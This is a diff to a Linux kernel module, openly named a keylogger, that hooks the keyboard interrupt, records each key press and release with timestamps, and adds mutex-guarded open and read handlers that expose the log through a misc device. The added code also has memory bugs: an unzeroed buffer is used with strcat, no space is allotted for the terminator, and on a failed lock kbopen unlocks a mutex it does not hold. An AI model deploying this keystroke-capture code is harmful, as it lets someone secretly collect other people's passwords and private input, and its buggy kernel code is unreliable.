@@ -46,8 +46,10 @@ MODULE_DESCRIPTION("Keyboard interrupt handler");
    static struct s_stroke *stroke_head = NULL;
    */
 
+static char *read_buffer = NULL;
 static struct miscdevice kbhandler;
 static unsigned char sc;
+static struct mutex g_mutex;
 
 static void got_char(unsigned long scancode_addr);
 DECLARE_TASKLET(kbtask, got_char, (unsigned long)&sc);
@@ -178,6 +180,7 @@ static void write_logs(void)
 
 }
 
+/*
 static int long_read(struct seq_file *m, void *v)
 {
 	struct s_stroke *tmp;
@@ -204,11 +207,95 @@ struct file_operations kbfops = {
 	.open = long_open,
 	.read = seq_read
 };
+*/
+
+static int get_count(void)
+{
+	struct s_stroke *tmp;
+	char buf[256] = {0};
+	int ret = 0;
+
+	tmp = stroke_head;
+	while (tmp) {
+		snprintf(buf, 256, "[%d:%d:%d] %s (%s%#x) %s\n", \
+			tmp->time.tm_hour, tmp->time.tm_min, tmp->time.tm_sec, \
+                        tmp->name, \
+                        tmp->multi ? "0xe0, " : "", tmp->key, \
+                        tmp->state ? "pressed" : "released");
+		ret += strlen(buf);
+		tmp = tmp->next;
+	}
+	return ret;
+}
+
+static int kbopen(struct inode *inode, struct file *f)
+{
+	struct s_stroke *tmp;
+	char buf[256] = {0};
+	int n;
+	int ret;
+	
+	ret = mutex_lock_interruptible(&g_mutex);
+	if (ret)
+		goto end;
+	f->private_data = NULL;
+	tmp = stroke_head;
+	n = get_count();
+	if (!n)
+		goto nullcase;
+	if (read_buffer)
+		kfree(read_buffer);
+	read_buffer = kmalloc(n * sizeof(char), GFP_KERNEL);
+	if (!read_buffer) {
+		ret = -ENOMEM;
+		goto end;
+	}
+	while (tmp) {
+		snprintf(buf, 256, "[%d:%d:%d] %s (%s%#x) %s\n", \
+			tmp->time.tm_hour, tmp->time.tm_min, tmp->time.tm_sec, \
+                        tmp->name, \
+                        tmp->multi ? "0xe0, " : "", tmp->key, \
+                        tmp->state ? "pressed" : "released");
+		strcat(read_buffer, buf);
+		tmp = tmp->next;
+	}
+nullcase:
+	ret = single_open(f, NULL, NULL);
+end:
+	mutex_unlock(&g_mutex);
+	return ret;
+}
+
+
+static ssize_t kbread(struct file *f, char __user *s, size_t n, loff_t *o)
+{
+	int ret;
+
+	ret = mutex_lock_interruptible(&g_mutex);
+	if (ret)
+		goto end;
+	if (!read_buffer)
+		goto end;
+	ret = simple_read_from_buffer(s, n, o, read_buffer, strlen(read_buffer));
+	if (!ret) {
+		kfree(read_buffer);
+		read_buffer = NULL;
+	}
+end:
+	mutex_unlock(&g_mutex);
+	return ret;
+}
+
+struct file_operations kbfops = {
+	.open = kbopen,
+	.read = kbread
+};
 
 static int __init hello_init(void) {
 	int ret;
 
 	printk(KERN_INFO "Keyboard keylogger initialized !\n");
+	mutex_init(&g_mutex);
 	kbhandler.minor = MISC_DYNAMIC_MINOR;
 	kbhandler.name = "kbhandler";
 	kbhandler.fops = &kbfops;
@@ -219,8 +306,12 @@ static int __init hello_init(void) {
 
 static void __exit hello_cleanup(void) {
 	printk(KERN_INFO "Destroying keylogger module.\n");
-	misc_deregister(&kbhandler);
 	write_logs();
+	kfree(read_buffer);
+	if (read_buffer)
+		read_buffer = NULL;
+	misc_deregister(&kbhandler);
+	mutex_destroy(&g_mutex);
 	free_irq(1, (void *)(irq_handler));
 }
 
